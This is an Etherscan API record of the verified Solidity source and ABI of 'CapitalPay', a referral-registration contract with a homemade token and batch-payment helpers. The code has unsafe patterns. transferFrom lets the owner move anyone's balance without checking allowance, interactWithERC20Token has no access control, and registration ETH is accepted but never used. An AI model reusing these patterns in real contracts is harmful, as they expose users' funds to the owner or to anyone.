{"status":"1","message":"OK","result":[{"SourceCode":"/**\r\n *Submitted for verification at Etherscan.io on 2020-08-12\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2020-07-31\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2020-07-29\r\n*/\r\n\r\npragma solidity >=0.4.23 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract CapitalPay is ERC20  {\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint partnersCount;\r\n    }\r\n    \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n\r\n\tmapping (address => uint256) public balances;\r\n\tmapping (address => mapping (address => uint256)) public allowed;\r\n \r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n\t\t\trequire(balances[msg.sender] >= _value);\r\n\t\t\tbalances[msg.sender] -= _value;\r\n\t\t\tbalances[_to] += _value;\r\n\t\t\temit Transfer(msg.sender, _to, _value); \r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {\r\n        require(balances[_from] >= _value);\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n\t\tallowed[_from][msg.sender] -= _value;\r\n        \r\n        emit Transfer(_from, _to, _value); \r\n        return true;\r\n    }\r\n    \r\n    \r\n        function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value); \r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    \r\n     \r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n    \r\n    \r\n    function interactWithERC20Token (address _tokenContractAddress, address _to, uint _value) public {\r\n        ERC20 myInstance = ERC20(_tokenContractAddress);\r\n        myInstance.transfer(_to,_value);\r\n    }\r\n    \r\n\r\n    mapping(address => User) public users;\r\n    mapping(uint => address) public idToAddress;\r\n    mapping(uint => address) public userIds;\r\n   // mapping(address => uint) public balances; \r\n\r\n    uint public lastUserId = 2;\r\n    address public owner;\r\n    \r\n   // mapping(uint8 => uint) public levelPrice;\r\n    \r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    \r\n    \r\n    constructor(address _ownerAddress) public {\r\n       // levelPrice[1] = 0.05 ether;\r\n        \r\n        owner = _ownerAddress;\r\n        \r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0),\r\n            partnersCount: uint(0)\r\n        });\r\n        \r\n        users[_ownerAddress] = user;\r\n        idToAddress[1] = _ownerAddress;\r\n\r\n        userIds[1] = _ownerAddress;\r\n        \r\n    }\r\n    \r\n    function() external payable {\r\n        if(msg.data.length == 0) {\r\n            return registration(msg.sender, owner, msg.value);\r\n        }\r\n        \r\n        registration(msg.sender, bytesToAddress(msg.data),msg.value);\r\n    }\r\n\r\n    function registrationExt(address _referrerAddress, uint256 _value) external payable {\r\n        registration(msg.sender, _referrerAddress, msg.value);\r\n    }\r\n    \r\n\r\n    \r\n    function registration(address _userAddress, address _referrerAddress, uint256 _value) private {\r\n       // require(msg.value == 0.05 ether, \"registration cost 0.05\");\r\n       // require(!isUserExists(_userAddress), \"user exists\");\r\n       // require(isUserExists(_referrerAddress), \"referrer not exists\");\r\n        \r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(_userAddress)\r\n        }\r\n        require(size == 0, \"cannot be a contract\");\r\n        \r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: _referrerAddress,\r\n            partnersCount: 0\r\n        });\r\n        \r\n        users[_userAddress] = user;\r\n        idToAddress[lastUserId] = _userAddress;\r\n        \r\n        users[_userAddress].referrer = _referrerAddress;\r\n\r\n        userIds[lastUserId] = _userAddress;\r\n        lastUserId++;\r\n        \r\n        users[_referrerAddress].partnersCount++;\r\n\r\n\r\n        emit Registration(_userAddress, _referrerAddress, users[_userAddress].id, users[_referrerAddress].id);\r\n    }\r\n    \r\n\r\n    \r\n    \r\n    function isUserExists(address _user) public view returns (bool) {\r\n        return (users[_user].id != 0);\r\n    }\r\n\r\n\r\n    function bytesToAddress(bytes memory bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n\r\n   function sendEth(address[] memory _to, uint256[] memory _value) public payable returns (bool success)  {\r\n\t\t// input validation\r\n\t\tassert(_to.length == _value.length);\r\n\t\tassert(_to.length <= 255);\r\n\t\t// count values for refunding sender\r\n\t\tuint256 beforeValue = msg.value;\r\n\t\tuint256 afterValue = 0;\r\n\t\t// loop through to addresses and send value\r\n\t\tfor (uint8 i = 0; i < _to.length; i++) {\r\n\t\t\tafterValue = afterValue + _value[i];\r\n\t\t\t//assert(_to[i].send(_value[i]));\r\n\t\t\taddress(uint160(_to[i])).transfer(_value[i]);\r\n\t\t}\r\n\t\t// send back remaining value to sender\r\n\t\tuint256 remainingValue = beforeValue - afterValue;\r\n\t\tif (remainingValue > 0) {\r\n\t\t\tassert(msg.sender.send(remainingValue));\r\n    \t}\r\n\t\treturn true;\r\n\t}\r\n\t\r\n\t\r\n\tfunction sendErc20(address _tokenAddress, address[] memory _to, uint256[] memory _value) public returns (bool success)  {\r\n\t\t// input validation\r\n\t\tassert(_to.length == _value.length);\r\n\t\tassert(_to.length <= 255);\r\n\t\t// use the erc20 abi\r\n\t\tERC20 token = ERC20(_tokenAddress);\r\n\t\t// loop through to addresses and send value\r\n\t\tfor (uint8 i = 0; i < _to.length; i++) {\r\n\t\t\tassert(token.transferFrom(msg.sender, _to[i], _value[i]) == true);\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_ownerAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenContractAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"interactWithERC20Token\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_referrerAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"registrationExt\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_to\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_value\",\"type\":\"uint256[]\"}],\"name\":\"sendErc20\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_to\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_value\",\"type\":\"uint256[]\"}],\"name\":\"sendEth\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userIds\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"CapitalPay","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000510556bb39aa55046c3620283409d6dfe1979c33","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://f2ce5112f83968cf999e148811d0a4cb0032440d9cb94ac2cc7ce7160a947ed8"}]}